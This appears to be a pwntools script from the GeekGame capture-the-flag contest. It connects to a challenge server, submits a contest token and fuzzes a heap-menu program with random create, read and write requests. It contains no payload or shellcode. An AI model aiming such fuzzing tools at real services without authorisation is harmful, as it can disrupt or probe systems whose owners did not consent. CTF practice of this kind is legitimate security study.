from pwn import *

TTL = 1

# conn = process('./run')
conn = process(argv = ['nc', 'prob11.geekgame.pku.edu.cn', '10011'])
print(conn.recvuntil(b'token:'), end = '>\n')
conn.sendline(b'165:MEQCIAO8Cvf2ewr9c8j2xJV-2MKt019qD2WRxsITgGZxEv-aAiApyfqPGe_LnG5HPuSqMFZzFLumbfL6yfGLiFS2WrnJQw==')


def rw(argv):
    slot = random.randint(0, 15)
    index = random.randint(0, 7)
    option = random.randint(0, 3)
    conn.sendline(f'{argv}'.encode('utf-8'))
    if(conn.recvuntil(b'slot:', timeout = TTL) == b''):
        return True
    conn.sendline(f'{slot}'.encode('utf-8'))
    # print(slot, index)
    if(conn.recvuntil(b'index:', timeout = TTL) == b''):
        return True
    # print(slot, index)
    conn.sendline(f'{index}'.encode('utf-8'))
    if(argv == 3):
        value = random.randint(0, 255)
        if(conn.recvuntil(b'value:', timeout = TTL) == b''):
            return True
        conn.sendline(f'{value}'.encode('utf-8'))
    if(conn.recvuntil(b'choice:', timeout = TTL) == b''):
        return True
    conn.sendline(f'{option}'.encode('utf-8'))
    return False

def create():
    conn.sendline(b'1')
    if(conn.recvuntil(b'choice:', timeout = TTL) == b''):
        return True
    choice = random.randint(1,3)
    conn.sendline(f'{choice}'.encode('utf-8'))
    if(conn.recvuntil(b'size:', timeout = TTL) == b''):
        return True
    size = 1024
    if(choice == 1):
        size = min([random.randint(1,4096) for _ in range(4)])
    conn.sendline(f'{size}'.encode('utf-8'))
    if(conn.recvuntil(b'choice:', timeout = TTL) == b''):
        return True
    conn.sendline(f'{random.randint(1,3)}'.encode('utf-8'))
    return False


for _ in range(32):
    create()

print('init complete')

# for _ in range(1000000):
#    argv = random.randint(1, 15)
#    conn.sendline(f'{argv}'.encode('utf-8'))
#conn.interactive()


for _ in range(4096000):
    if(conn.recvuntil(b'choice:', timeout = TTL * 10) == b''):
        break
    argv = random.randint(1, 3)
    # print(argv)
    if(argv == 1):
        if(create()):
            pass
    if(argv == 2 or argv == 3):
        if(rw(argv)):
            pass


print('complete')

conn.interactive()